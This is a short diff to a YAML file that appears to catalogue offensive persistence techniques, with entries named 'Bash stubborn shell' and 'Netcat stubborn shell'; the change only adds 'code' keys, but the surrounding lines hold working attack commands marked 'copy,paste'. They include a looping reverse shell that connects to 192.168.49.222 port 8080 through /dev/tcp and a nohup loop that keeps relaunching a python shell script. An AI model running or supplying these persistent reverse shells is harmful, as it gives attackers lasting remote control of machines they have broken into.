@@ -19,6 +19,7 @@ functions:
         nohup bash -c "while true; do python3 ./pyshell.py 2>/dev/null;sleep 5;done &"
 
     - description: Bash stubborn shell
+      code: |
         copy,paste
 
         cat > bashshell.sh <<EOF
@@ -29,6 +30,7 @@ functions:
         nohup bash -c "while true; do /bin/bash -i >& /dev/tcp/192.168.49.222/8080 0>&1;sleep 5;done &"
 
     - description: Netcat stubborn shell
+      code: |
         copy,paste
 
         cat > ncshell.sh <<EOF
